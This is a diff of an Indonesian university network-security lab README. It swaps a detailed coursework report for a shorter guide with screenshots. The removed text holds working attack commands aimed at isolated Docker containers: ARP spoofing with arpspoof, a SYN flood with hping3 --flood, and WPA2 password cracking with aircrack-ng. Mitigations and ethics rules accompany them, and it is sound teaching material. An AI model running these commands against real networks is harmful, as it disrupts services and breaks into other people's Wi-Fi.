@@ -1,729 +1,294 @@
-<<<<<<< HEAD
-# LAPORAN UTS NETWORK SECURITY
-## Kasus 5 (K5) — Dokumentasi Tugas 1–7
+# UTS Network Security — Kasus 5
 
-**Nama:** Putra Baadi Zaelani  
-**NIM:** [Isi NIM]  
-**Program Studi:** Teknik Informatika  
-**Mata Kuliah:** Network Security  
+Dokumentasi praktikum **Kasus 5 (Tugas 1–7)**. Repository ini berisi sumber lab, lembar instruksi, laporan, dan bukti screenshot dari pengujian pada lingkungan Kali Linux/Docker.
 
----
+> **Catatan:** Screenshot di bawah merupakan dokumentasi terminal dari arsip praktikum. Isi laporan hasil/kesimpulan perlu dicocokkan dengan output aktual sebelum dikumpulkan.
 
-# Parameter Praktikum
+## Daftar isi
 
-| Parameter | Nilai |
-|---|---|
-| Container target | `target-k5` |
-| Volume | `vol-k5` |
-| File | `laporan-k5.txt` |
-| Kata sandi enkripsi | `kunci-k5-2026` |
-| Domain DNS | `k5.exfil.lab` |
+- [Struktur repository](#struktur-repository)
+- [Referensi materi](#referensi-materi)
+- [Persiapan lingkungan](#persiapan-lingkungan)
+- [Langkah menjalankan praktikum](#langkah-menjalankan-praktikum)
+- [Dokumentasi screenshot](#dokumentasi-screenshot)
+- [Keamanan dan etika](#keamanan-dan-etika)
 
-**Catatan:** Semua pengujian dilakukan pada lingkungan lab yang disediakan untuk praktikum. Placeholder `NIM-ANDA` diganti dengan NIM mahasiswa.
+## Struktur repository
 
----
+```text
+UTS-Network-Security/
+├── 01-sumber-lab/
+│   ├── b/
+│   ├── images/
+│   └── kasus/
+├── 02-dokumen/
+│   └── LEMBAR-PERINTAH-K5.md
+├── 03-hasil-kasus-5/
+│   ├── tugas-1/
+│   │   ├── hasil.md
+│   │   └── screenshot/
+│   ├── tugas-2/
+│   ├── tugas-3/
+│   ├── tugas-4/
+│   ├── tugas-5/
+│   ├── tugas-6/
+│   └── tugas-7/
+└── README.md
+```
 
-# TUGAS 1 — DOCKER DAN VOLUME
-## Pertemuan 1
+## Referensi materi
 
-### 1. Tujuan
-Memahami penggunaan Docker Volume untuk menyimpan data secara persisten, sehingga data tidak hilang ketika container dihapus. Selain itu, menguji komunikasi antarcontainer menggunakan Docker Compose.
+Materi/sumber lab perkuliahan:
 
-### 2. Perintah dan penjelasan
+- **Repository Pak Ihwan:** [Network-Security-Course-Bank](https://github.com/Muhammad-Ikhwan-Fathulloh/Network-Security-Course-Bank)
+- Repository pengumpulan Kasus 5 ini berisi penataan ulang materi dan dokumentasi tugas 1–7. Sesuaikan perintah dengan lembar instruksi dosen dan konfigurasi lab yang digunakan.
 
-**A. Membuat Docker Volume**
+## Persiapan lingkungan
+
+1. Gunakan Kali Linux atau lingkungan Linux yang disyaratkan dosen.
+2. Pastikan Docker Engine dan Docker Compose tersedia.
+3. Pastikan Git tersedia.
+4. Clone repository tugas:
 
 ```bash
+git clone https://github.com/Baadizlniii/UTS-Network-Security.git
+cd UTS-Network-Security
+```
+
+5. Baca instruksi lengkap di `02-dokumen/LEMBAR-PERINTAH-K5.md`.
+6. Periksa struktur sumber lab:
+
+```bash
+tree -L 4
+```
+
+Jika perintah `tree` belum tersedia:
+
+```bash
+sudo apt update
+sudo apt install tree -y
+```
+
+## Langkah menjalankan praktikum
+
+> Jalankan perintah dari direktori yang disebutkan. Nama file dan path harus mengikuti struktur repository.
+
+### Tugas 1 — Docker dan Volume
+
+```bash
+cd ~/UTS-Network-Security/01-sumber-lab
 docker volume create vol-k5
-```
-
-Penjelasan:
-- `docker volume create` digunakan untuk membuat penyimpanan permanen.
-- `vol-k5` merupakan nama volume yang digunakan dalam praktikum.
-- Volume digunakan agar data dapat bertahan meskipun container dihapus.
-
-**B. Menyimpan NIM ke dalam volume**
-
-```bash
 docker run --name w-k5 -v vol-k5:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k5.txt'
-```
-
-Penjelasan:
-- `docker run` menjalankan container baru.
-- `--name w-k5` memberikan nama container.
-- `-v vol-k5:/data` menghubungkan volume ke direktori `/data`.
-- `alpine` merupakan image Linux berukuran ringan.
-- `echo NIM-ANDA` menuliskan NIM ke dalam file.
-- `>` menyimpan hasil tulisan ke `laporan-k5.txt`.
-
-**C. Menghapus container pertama**
-
-```bash
 docker rm w-k5
-```
-
-Penjelasan:
-- `docker rm` menghapus container yang sudah berhenti.
-- Penghapusan ini digunakan untuk membuktikan bahwa data tetap tersimpan di volume.
-
-**D. Membaca data dari container baru**
-
-```bash
 docker run --rm -v vol-k5:/data alpine cat /data/laporan-k5.txt
-```
-
-Penjelasan:
-- `--rm` menghapus container secara otomatis setelah perintah selesai.
-- Volume `vol-k5` dipasang kembali pada `/data`.
-- `cat` digunakan untuk membaca isi file.
-- Jika NIM masih tampil, berarti data berhasil dipertahankan meskipun container sebelumnya sudah dihapus.
-
-**E. Menjalankan Docker Compose**
-
-```bash
 docker compose -p k5 -f b/b1-compose/docker-compose.yml up -d
-```
-
-Penjelasan:
-- `docker compose` menjalankan layanan berdasarkan konfigurasi YAML.
-- `-p k5` memberikan nama proyek `k5`.
-- `-f` menentukan lokasi file konfigurasi.
-- `up -d` menjalankan container di latar belakang.
-
-**F. Menguji komunikasi attacker ke target**
-
-```bash
+docker compose -p k5 -f b/b1-compose/docker-compose.yml ps
 docker compose -p k5 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
-```
-
-Penjelasan:
-- `exec attacker` menjalankan perintah dari container attacker.
-- `wget` digunakan untuk mengakses layanan web.
-- `http://target` merupakan alamat container target berdasarkan nama layanan.
-- `-qO-` menampilkan isi halaman tanpa pesan tambahan.
-- Halaman Welcome to nginx menunjukkan komunikasi antarcontainer berhasil.
-
-**G. Menghentikan dan membersihkan lab**
-
-```bash
 docker compose -p k5 -f b/b1-compose/docker-compose.yml down -v
 ```
 
-Penjelasan:
-- `down` menghentikan dan menghapus container serta network proyek.
-- `-v` turut menghapus volume yang dikelola oleh Compose.
-- Perintah ini digunakan untuk membersihkan lingkungan praktikum.
+Ganti `NIM-ANDA` dengan NIM sendiri. Simpan bukti persistensi volume dan halaman Nginx.
 
-### 3. Bukti Praktikum
+### Tugas 2 — Kriptografi
 
-**Screenshot 1:** Pembuatan volume dan penyimpanan NIM.
+Jalankan perintah OpenSSL sesuai lembar instruksi `LEMBAR-PERINTAH-K5.md`. Dokumentasikan:
+- Perbandingan hash SHA-256 file asli dan hasil dekripsi.
+- Informasi Subject, Issuer, dan masa berlaku sertifikat.
+- Keberhasilan enkripsi dan dekripsi.
 
-[Tempel screenshot di sini]
+Jangan commit private key (`.pem`, `.key`) atau file rahasia.
 
-**Screenshot 2:** Pembacaan file dari container baru setelah container pertama dihapus.
+### Tugas 3 — ARP Spoofing
 
-[Tempel screenshot di sini]
+Jalankan lab ARP yang terisolasi sesuai instruksi dosen. Dokumentasikan tabel ARP sebelum pengujian, perubahan MAC saat pengujian, dan pemulihan setelah mitigasi. Hentikan proses sesuai batas waktu yang ditentukan.
 
-**Screenshot 3:** Hasil akses halaman Nginx dari container attacker.
+### Tugas 4 — WPA2 Handshake
 
-[Tempel screenshot di sini]
+Gunakan file handshake dan wordlist yang disediakan untuk praktikum. Dokumentasikan hasil Aircrack-ng, baik password ditemukan maupun `KEY NOT FOUND`. Jangan melakukan pengujian terhadap jaringan pihak lain.
 
-### 4. Kesimpulan
+### Tugas 5 — Scapy ICMP
 
-Docker Volume memungkinkan data tetap tersimpan meskipun container dihapus. Docker Compose juga mempermudah pengelolaan beberapa container dan memungkinkan komunikasi antarcontainer melalui jaringan yang telah dikonfigurasi.
+Jalankan script Scapy pada jaringan lab dan alamat target yang ditentukan. Dokumentasikan perintah, alamat tujuan, serta hasil pengamatan paket ICMP.
+
+### Tugas 6 — SYN Flood
+
+Lakukan pengujian hanya pada target/container lab terisolasi. Dokumentasikan kondisi koneksi sebelum dan selama pengujian serta hasil pengamatan paket. Hentikan pengujian sesuai batas waktu pada lembar instruksi.
+
+### Tugas 7 — DNS Exfiltration
+
+Jalankan lab DNS sesuai instruksi. Dokumentasikan query DNS, label hexadecimal, log, dan hasil analisis script. Jangan unggah log yang memuat NIM atau data pribadi ke repository publik.
+
+## Dokumentasi screenshot
+
+Screenshot dikelompokkan berdasarkan tugas/pertemuan. Klik gambar untuk melihat ukuran aslinya. Laporan per tugas juga tersedia di folder masing-masing.
+
+### Tugas 1 — Docker dan Volume
+
+Pengujian persistensi Docker Volume dan komunikasi antarkontainer melalui Docker Compose.
+
+**Bukti 1**
+
+![Docker dan Volume - bukti 1](03-hasil-kasus-5/tugas-1/screenshot/01.jpg)
+
+**Bukti 2**
+
+![Docker dan Volume - bukti 2](03-hasil-kasus-5/tugas-1/screenshot/02.jpg)
+
+**Bukti 3**
+
+![Docker dan Volume - bukti 3](03-hasil-kasus-5/tugas-1/screenshot/03.jpg)
+
+**Bukti 4**
+
+![Docker dan Volume - bukti 4](03-hasil-kasus-5/tugas-1/screenshot/04.jpg)
+
+**Bukti 5**
+
+![Docker dan Volume - bukti 5](03-hasil-kasus-5/tugas-1/screenshot/05.jpg)
+
+**Bukti 6**
+
+![Docker dan Volume - bukti 6](03-hasil-kasus-5/tugas-1/screenshot/06.jpg)
+
+**Bukti 7**
+
+![Docker dan Volume - bukti 7](03-hasil-kasus-5/tugas-1/screenshot/07.jpg)
+
+### Tugas 2 — Kriptografi
+
+Pengujian hash SHA-256, enkripsi/dekripsi AES, serta sertifikat digital OpenSSL.
+
+**Bukti 1**
+
+![Kriptografi - bukti 1](03-hasil-kasus-5/tugas-2/screenshot/01.jpg)
+
+### Tugas 3 — ARP Spoofing
+
+Pengamatan ARP pada jaringan lab terisolasi dan pengujian perubahan pemetaan IP–MAC.
+
+**Bukti 1**
+
+![ARP Spoofing - bukti 1](03-hasil-kasus-5/tugas-3/screenshot/01.jpg)
+
+**Bukti 2**
+
+![ARP Spoofing - bukti 2](03-hasil-kasus-5/tugas-3/screenshot/02.jpg)
+
+**Bukti 3**
+
+![ARP Spoofing - bukti 3](03-hasil-kasus-5/tugas-3/screenshot/03.jpg)
+
+**Bukti 4**
+
+![ARP Spoofing - bukti 4](03-hasil-kasus-5/tugas-3/screenshot/04.jpg)
+
+**Bukti 5**
+
+![ARP Spoofing - bukti 5](03-hasil-kasus-5/tugas-3/screenshot/05.jpg)
+
+**Bukti 6**
+
+![ARP Spoofing - bukti 6](03-hasil-kasus-5/tugas-3/screenshot/06.jpg)
+
+**Bukti 7**
+
+![ARP Spoofing - bukti 7](03-hasil-kasus-5/tugas-3/screenshot/07.jpg)
+
+**Bukti 8**
+
+![ARP Spoofing - bukti 8](03-hasil-kasus-5/tugas-3/screenshot/08.jpg)
+
+**Bukti 9**
+
+![ARP Spoofing - bukti 9](03-hasil-kasus-5/tugas-3/screenshot/09.jpg)
+
+**Bukti 10**
+
+![ARP Spoofing - bukti 10](03-hasil-kasus-5/tugas-3/screenshot/10.jpg)
+
+### Tugas 4 — WPA2 Handshake
+
+Analisis file handshake WPA2 menggunakan wordlist dan Aircrack-ng.
+
+**Bukti 1**
+
+![WPA2 Handshake - bukti 1](03-hasil-kasus-5/tugas-4/screenshot/01.jpg)
+
+### Tugas 5 — Scapy ICMP
+
+Pengiriman dan pengamatan paket ICMP menggunakan Scapy pada lingkungan lab.
+
+**Bukti 1**
+
+![Scapy ICMP - bukti 1](03-hasil-kasus-5/tugas-5/screenshot/01.jpg)
+
+### Tugas 6 — SYN Flood
+
+Pengamatan koneksi TCP/SYN pada target lab terisolasi dan analisis paket.
+
+**Bukti 1**
+
+![SYN Flood - bukti 1](03-hasil-kasus-5/tugas-6/screenshot/01.jpg)
+
+**Bukti 2**
+
+![SYN Flood - bukti 2](03-hasil-kasus-5/tugas-6/screenshot/02.jpg)
+
+**Bukti 3**
+
+![SYN Flood - bukti 3](03-hasil-kasus-5/tugas-6/screenshot/03.jpg)
+
+**Bukti 4**
+
+![SYN Flood - bukti 4](03-hasil-kasus-5/tugas-6/screenshot/04.jpg)
+
+**Bukti 5**
+
+![SYN Flood - bukti 5](03-hasil-kasus-5/tugas-6/screenshot/05.jpg)
+
+**Bukti 6**
+
+![SYN Flood - bukti 6](03-hasil-kasus-5/tugas-6/screenshot/06.jpg)
+
+### Tugas 7 — DNS Exfiltration
+
+Pengamatan query DNS dengan label hexadecimal dan analisis indikasi eksfiltrasi.
+
+**Bukti 1**
+
+![DNS Exfiltration - bukti 1](03-hasil-kasus-5/tugas-7/screenshot/01.jpg)
+
+**Bukti 2**
+
+![DNS Exfiltration - bukti 2](03-hasil-kasus-5/tugas-7/screenshot/02.jpg)
+
+**Bukti 3**
+
+![DNS Exfiltration - bukti 3](03-hasil-kasus-5/tugas-7/screenshot/03.jpg)
+
+**Bukti 4**
+
+![DNS Exfiltration - bukti 4](03-hasil-kasus-5/tugas-7/screenshot/04.jpg)
+
+**Bukti 5**
+
+![DNS Exfiltration - bukti 5](03-hasil-kasus-5/tugas-7/screenshot/05.jpg)
+
+**Bukti 6**
+
+![DNS Exfiltration - bukti 6](03-hasil-kasus-5/tugas-7/screenshot/06.jpg)
+
+**Bukti 7**
+
+![DNS Exfiltration - bukti 7](03-hasil-kasus-5/tugas-7/screenshot/07.jpg)
+
+
+## Keamanan dan etika
+
+- Semua eksperimen keamanan jaringan hanya dilakukan pada container/jaringan lab yang terisolasi dan atas izin dosen.
+- Jangan menguji sistem, Wi-Fi, domain, atau alamat IP milik pihak lain.
+- Jangan unggah Personal Access Token, password, private key, file `.env`, atau log yang mengandung data pribadi.
+- Periksa kembali isi laporan dan screenshot sebelum repository dibagikan atau dikumpulkan.
 
 ---
-
-# TUGAS 2 — KRIPTOGRAFI
-## Pertemuan 2
-
-### 1. Tujuan
-Memahami proses enkripsi dan dekripsi menggunakan algoritma AES-256-CBC, membandingkan hash SHA-256, serta membuat sertifikat digital menggunakan RSA dan X.509.
-
-### 2. Perintah dan penjelasan
-
-**A. Enkripsi dan dekripsi file**
-
-```bash
-docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k5 > laporan-k5.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k5.txt -out laporan-k5.enc -pass pass:kunci-k5-2026 && sha256sum laporan-k5.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k5.enc -out hasil-k5.txt -pass pass:kunci-k5-2026 && sha256sum hasil-k5.txt'
-```
-
-Penjelasan:
-- `docker run --rm` menjalankan container sementara.
-- `-v "$PWD":/work` menghubungkan direktori kerja ke container.
-- `uts-openssl` merupakan image yang menyediakan OpenSSL.
-- `echo` membuat isi awal file laporan.
-- `openssl enc` digunakan untuk melakukan enkripsi.
-- `-aes-256-cbc` menentukan algoritma AES dengan kunci 256-bit dan mode CBC.
-- `-pbkdf2` menggunakan mekanisme derivasi kunci PBKDF2.
-- `-salt` menambahkan salt pada proses derivasi kunci.
-- `-in` menentukan file masukan.
-- `-out` menentukan file hasil enkripsi.
-- `-pass` memberikan kata sandi praktikum.
-- `openssl enc -d` melakukan proses dekripsi.
-- `sha256sum` menghitung hash SHA-256 untuk membandingkan file asli dan hasil dekripsi.
-- Jika kedua hash sama, isi file hasil dekripsi sesuai dengan file aslinya.
-
-**B. Membuat sertifikat digital**
-
-```bash
-docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k5.pem -out cert-k5.pem -days 30 -subj /CN=k5.uts.local && openssl x509 -in cert-k5.pem -noout -subject -issuer -dates'
-```
-
-Penjelasan:
-- `openssl req` digunakan untuk membuat permintaan atau sertifikat.
-- `-x509` menghasilkan sertifikat X.509 yang ditandatangani sendiri.
-- `-newkey rsa:2048` membuat pasangan kunci RSA 2048-bit.
-- `-nodes` membuat private key tanpa enkripsi kata sandi.
-- `-keyout` menentukan lokasi penyimpanan private key.
-- `-out` menentukan lokasi penyimpanan sertifikat.
-- `-days 30` menentukan masa berlaku sertifikat selama 30 hari.
-- `-subj /CN=k5.uts.local` menentukan Common Name sertifikat.
-- `openssl x509` digunakan untuk membaca informasi sertifikat.
-- `-noout` menampilkan informasi tanpa mencetak isi sertifikat.
-- `-subject`, `-issuer`, dan `-dates` menampilkan identitas penerbit serta masa berlaku sertifikat.
-
-### 3. Bukti Praktikum
-
-**Screenshot 1:** Proses enkripsi, dekripsi, dan hasil hash SHA-256.
-
-[Tempel screenshot di sini]
-
-**Screenshot 2:** Subject, Issuer, dan masa berlaku sertifikat.
-
-[Tempel screenshot di sini]
-
-### 4. Hasil Pengujian
-
-Hash file asli: [Isi hasil SHA-256]
-
-Hash file hasil dekripsi: [Isi hasil SHA-256]
-
-Subject: [Isi hasil]
-
-Issuer: [Isi hasil]
-
-### 5. Kesimpulan
-
-AES-256-CBC digunakan untuk melindungi kerahasiaan file melalui enkripsi. Hash SHA-256 dapat digunakan untuk memeriksa kesamaan isi file setelah dekripsi. Sertifikat X.509 digunakan untuk mengidentifikasi entitas melalui informasi sertifikat digital.
-
----
-
-# TUGAS 3 — ARP SPOOFING
-## Pertemuan 3
-
-### 1. Tujuan
-Memahami cara kerja protokol ARP, mempelajari simulasi ARP spoofing dalam jaringan lab terisolasi, dan mengetahui mitigasi menggunakan static ARP.
-
-### 2. Perintah dan penjelasan
-
-**A. Membuat jaringan lab**
-
-```bash
-docker network create lab-arp-k5
-```
-
-Penjelasan:
-- `docker network create` membuat jaringan baru.
-- `lab-arp-k5` merupakan nama jaringan khusus praktikum.
-- Jaringan ini digunakan sebagai lingkungan komunikasi antarcontainer.
-
-**B. Menjalankan container korban**
-
-```bash
-docker run -d --name korban-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
-```
-
-Penjelasan:
-- `-d` menjalankan container di latar belakang.
-- `--name korban-k5` memberikan nama container korban.
-- `--network lab-arp-k5` menghubungkan container ke jaringan lab.
-- `--cap-add NET_ADMIN` memberikan kemampuan administrasi jaringan yang diperlukan untuk praktikum.
-- `uts-kali-tools` merupakan image yang menyediakan alat pengujian jaringan.
-
-**C. Menjalankan container gateway**
-
-```bash
-docker run -d --name gateway-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
-```
-
-Penjelasan:
-- Membuat container yang berperan sebagai gateway simulasi.
-- Container ditempatkan pada jaringan yang sama dengan korban.
-- Kemampuan `NET_ADMIN` digunakan untuk keperluan pengaturan jaringan.
-
-**D. Menjalankan container penyerang**
-
-```bash
-docker run -d --name penyerang-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
-```
-
-Penjelasan:
-- Membuat container untuk melakukan simulasi ARP spoofing.
-- Container berada di jaringan lab yang sama.
-- Pengujian dibatasi pada container praktikum.
-
-**E. Memeriksa alamat IP container**
-
-```bash
-docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k5.IPAddress}}' korban-k5 gateway-k5
-```
-
-Penjelasan:
-- `docker inspect` digunakan untuk membaca informasi container.
-- Format `-f` memilih informasi tertentu menggunakan template.
-- `IPAddress` menampilkan alamat IP container.
-- Informasi ini diperlukan untuk mengetahui alamat korban dan gateway.
-
-**F. Melihat tabel ARP korban**
-
-```bash
-docker exec korban-k5 arp -a
-```
-
-Penjelasan:
-- `docker exec` menjalankan perintah di dalam container.
-- `arp -a` menampilkan tabel ARP.
-- Tabel tersebut berisi pemetaan alamat IP ke alamat MAC.
-
-**G. Melakukan simulasi ARP spoofing**
-
-```bash
-docker exec -d penyerang-k5 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
-```
-
-Penjelasan:
-- Perintah dijalankan dari container penyerang.
-- `timeout 20` membatasi durasi pengujian selama 20 detik.
-- `arpspoof` merupakan alat untuk simulasi pemalsuan pesan ARP.
-- `-i eth0` menentukan interface jaringan.
-- `-t` menentukan alamat IP korban.
-- Alamat IP gateway menjadi target pemalsuan pemetaan ARP.
-- Pengujian hanya dilakukan pada jaringan lab yang dibuat.
-
-**H. Memeriksa perubahan tabel ARP**
-
-```bash
-docker exec korban-k5 arp -a
-```
-
-Penjelasan:
-- Memeriksa kembali tabel ARP setelah simulasi.
-- Perubahan alamat MAC pada entri gateway dapat menunjukkan dampak simulasi ARP spoofing.
-
-**I. Menerapkan static ARP**
-
-```bash
-docker exec korban-k5 arp -s <ip-gateway> <mac-gateway>
-```
-
-Penjelasan:
-- `arp -s` digunakan untuk menambahkan pemetaan IP dan MAC secara statis.
-- `<ip-gateway>` diganti dengan IP gateway.
-- `<mac-gateway>` diganti dengan MAC asli gateway.
-- Static ARP membantu mencegah perubahan pemetaan secara dinamis pada entri tersebut.
-
-**J. Memeriksa hasil mitigasi**
-
-```bash
-docker exec korban-k5 arp -a
-```
-
-Penjelasan:
-- Memeriksa kembali tabel ARP setelah mitigasi.
-- Entri gateway diharapkan menggunakan alamat MAC asli yang telah ditentukan.
-
-### 3. Bukti Praktikum
-
-**Screenshot 1:** Pembuatan jaringan dan tiga container.
-
-[Tempel screenshot di sini]
-
-**Screenshot 2:** Tabel ARP sebelum simulasi.
-
-[Tempel screenshot di sini]
-
-**Screenshot 3:** Tabel ARP setelah simulasi ARP spoofing.
-
-[Tempel screenshot di sini]
-
-**Screenshot 4:** Tabel ARP setelah penerapan mitigasi static ARP.
-
-[Tempel screenshot di sini]
-
-### 4. Kesimpulan
-
-ARP spoofing merupakan teknik manipulasi pemetaan alamat IP dan MAC pada jaringan lokal. Static ARP dapat digunakan sebagai salah satu langkah mitigasi dengan menetapkan pemetaan IP dan MAC secara manual.
-
----
-
-# TUGAS 4 — ANALISIS HANDSHAKE WPA2
-## Pertemuan 4
-
-### 1. Tujuan
-Memahami proses autentikasi WPA2 dan menganalisis file capture handshake menggunakan Aircrack-ng serta wordlist yang telah disediakan penguji.
-
-### 2. Perintah dan penjelasan
-
-```bash
-docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k5.txt handshake-k5.cap
-```
-
-Penjelasan:
-- `docker run --rm` menjalankan container sementara.
-- `-v "$PWD":/work` menghubungkan direktori kerja ke container.
-- `uts-kali-tools` merupakan image yang menyediakan Aircrack-ng.
-- `aircrack-ng` digunakan untuk menganalisis capture WPA/WPA2.
-- `-w wordlist-k5.txt` menentukan file daftar kata sandi yang digunakan untuk pengujian.
-- `handshake-k5.cap` merupakan file capture yang dianalisis.
-- Hasil pengujian dapat menunjukkan kata sandi ditemukan atau `KEY NOT FOUND`.
-
-### 3. Penjelasan Four-Way Handshake
-
-WPA2 menggunakan proses Four-Way Handshake untuk membentuk dan memastikan kunci komunikasi antara access point dan client.
-
-1. **Message 1:** Access Point mengirimkan ANonce kepada client.
-2. **Message 2:** Client mengirimkan SNonce dan MIC sebagai bagian dari proses autentikasi.
-3. **Message 3:** Access Point mengirimkan informasi pengamanan dan konfirmasi kepada client.
-4. **Message 4:** Client mengirimkan konfirmasi bahwa proses handshake berhasil.
-
-Proses ini memastikan kedua pihak memiliki material kunci yang sesuai sebelum komunikasi berlangsung.
-
-### 4. Bukti Praktikum
-
-**Screenshot 1:** Perintah Aircrack-ng dan proses analisis handshake.
-
-[Tempel screenshot di sini]
-
-**Screenshot 2:** Hasil akhir pengujian, baik kata sandi ditemukan maupun `KEY NOT FOUND`.
-
-[Tempel screenshot di sini]
-
-### 5. Hasil Pengujian
-
-Status hasil: [Isi sesuai output aktual]
-
-Analisis: [Jelaskan apakah wordlist berhasil menemukan kata sandi atau tidak.]
-
-### 6. Kesimpulan
-
-Analisis handshake WPA2 membantu memahami proses autentikasi jaringan Wi-Fi. Aircrack-ng dapat digunakan untuk menguji kecocokan kandidat kata sandi dari wordlist terhadap data handshake yang tersedia.
-
----
-
-# TUGAS 5 — ICMP DENGAN SCAPY
-## Pertemuan 5
-
-### 1. Tujuan
-Memahami protokol ICMP dan menggunakan Scapy untuk mengirim paket ICMP serta mengamati respons dari host tujuan.
-
-### 2. Perintah dan penjelasan
-
-```bash
-docker run --rm --network lab-arp-k5 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
-```
-
-Penjelasan:
-- `docker run --rm` menjalankan container sementara.
-- `--network lab-arp-k5` menghubungkan container ke jaringan lab.
-- `-v "$PWD/kasus/k5-scapy:/work"` menghubungkan folder script ke dalam container.
-- `uts-kali-tools` merupakan image yang menyediakan Python dan Scapy.
-- `python3` menjalankan script Python.
-- `/work/kirim_icmp.py` merupakan file program yang digunakan untuk mengirim paket ICMP.
-- `<ip-korban>` diganti dengan alamat IP container tujuan.
-
-### 3. Penjelasan Hasil
-
-Beberapa informasi yang diamati:
-
-- **TTL (Time To Live):** Menunjukkan batas waktu hidup paket IP dalam satuan hop.
-- **ICMP Type:** Menunjukkan jenis pesan ICMP.
-- **Type 8:** Echo Request.
-- **Type 0:** Echo Reply.
-
-Jika program menerima balasan dengan Type 0, berarti host tujuan memberikan respons ICMP Echo Reply.
-
-### 4. Penjelasan Smurf Attack
-
-Smurf Attack merupakan salah satu jenis serangan DoS yang memanfaatkan ICMP Echo Request dan alamat broadcast. Dalam serangan ini, alamat IP korban dapat dipalsukan sebagai sumber paket sehingga banyak host mengirimkan balasan ke korban.
-
-Mitigasi dapat dilakukan dengan membatasi atau menonaktifkan respons ICMP broadcast dan menerapkan penyaringan paket pada jaringan.
-
-### 5. Bukti Praktikum
-
-**Screenshot 1:** Perintah menjalankan script Scapy.
-
-[Tempel screenshot di sini]
-
-**Screenshot 2:** Hasil TTL dan tipe ICMP balasan.
-
-[Tempel screenshot di sini]
-
-### 6. Hasil Pengujian
-
-TTL balasan: [Isi hasil aktual]
-
-Tipe ICMP balasan: [Isi hasil aktual]
-
-Analisis: [Jelaskan hasil komunikasi ICMP.]
-
-### 7. Kesimpulan
-
-Scapy dapat digunakan untuk membuat dan mengirim paket jaringan secara terprogram. Melalui pengujian ini, mahasiswa dapat memahami proses ICMP Echo Request dan Echo Reply serta mengenali potensi penyalahgunaan ICMP pada Smurf Attack.
-
----
-
-# TUGAS 6 — SYN FLOOD DAN THREE-WAY HANDSHAKE
-## Pertemuan 6
-
-### 1. Tujuan
-Memahami proses TCP Three-Way Handshake dan mengetahui dampak SYN Flood terhadap ketersediaan layanan jaringan melalui simulasi terbatas di lingkungan lab.
-
-### 2. Perintah dan penjelasan
-
-**A. Menjalankan lab**
-
-```bash
-docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml up -d
-```
-
-Penjelasan:
-- Menjalankan layanan target dan attacker berdasarkan konfigurasi Docker Compose.
-- `-p k5` memberikan nama proyek.
-- `up -d` menjalankan layanan di latar belakang.
-
-**B. Memeriksa koneksi SYN_RECV sebelum pengujian**
-
-```bash
-docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
-```
-
-Penjelasan:
-- `exec target` menjalankan perintah di container target.
-- `netstat -ant` menampilkan koneksi TCP.
-- `grep -c SYN_RECV` menghitung jumlah koneksi dengan status SYN_RECV.
-- Hasil ini menjadi kondisi awal sebelum simulasi.
-
-**C. Simulasi SYN Flood terbatas**
-
-```bash
-docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
-```
-
-Penjelasan:
-- Perintah dijalankan dari container attacker pada jaringan lab.
-- `timeout 15` membatasi pengujian selama 15 detik.
-- `hping3` merupakan alat untuk pengujian paket jaringan.
-- `-S` mengatur flag SYN pada paket TCP.
-- `-p 80` menentukan port tujuan 80.
-- `--flood` mengirimkan paket secara cepat untuk simulasi beban koneksi.
-- Pengujian dibatasi hanya pada target lab.
-
-**D. Memeriksa SYN_RECV selama pengujian**
-
-```bash
-docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
-```
-
-Penjelasan:
-- Menghitung kembali koneksi dengan status SYN_RECV.
-- Hasilnya dibandingkan dengan kondisi awal.
-- Peningkatan jumlah koneksi dapat menunjukkan adanya penumpukan permintaan koneksi TCP.
-
-**E. Mengamati paket TCP**
-
-```bash
-docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
-```
-
-Penjelasan:
-- `tcpdump` digunakan untuk menangkap dan mengamati paket jaringan.
-- `-i eth0` menentukan interface yang diamati.
-- `-nn` menampilkan alamat IP dan port tanpa menerjemahkan nama.
-- `tcp port 80` membatasi pengamatan pada lalu lintas TCP port 80.
-- `timeout 10` membatasi durasi pengamatan.
-- `curl` mengirim permintaan HTTP ke target.
-- Output curl diarahkan ke `/dev/null` agar tidak menampilkan isi halaman.
-
-**F. Membersihkan lab**
-
-```bash
-docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml down -v
-```
-
-Penjelasan:
-- Menghentikan dan menghapus container serta network yang dikelola oleh proyek Compose.
-- `-v` menghapus volume yang dikelola oleh proyek tersebut.
-
-### 3. Penjelasan TCP Three-Way Handshake
-
-TCP menggunakan tiga tahapan utama untuk membangun koneksi:
-
-1. **SYN:** Client meminta untuk memulai koneksi ke server.
-2. **SYN-ACK:** Server memberikan respons bahwa permintaan diterima.
-3. **ACK:** Client mengirimkan konfirmasi terakhir.
-
-Setelah tiga tahap tersebut selesai, koneksi TCP dapat digunakan untuk pertukaran data.
-
-### 4. Bukti Praktikum
-
-**Screenshot 1:** Jumlah SYN_RECV sebelum simulasi.
-
-[Tempel screenshot di sini]
-
-**Screenshot 2:** Simulasi SYN Flood terbatas dan jumlah SYN_RECV saat pengujian.
-
-[Tempel screenshot di sini]
-
-**Screenshot 3:** Hasil tcpdump yang menunjukkan proses TCP.
-
-[Tempel screenshot di sini]
-
-### 5. Hasil Pengujian
-
-Jumlah SYN_RECV sebelum pengujian: [Isi hasil]
-
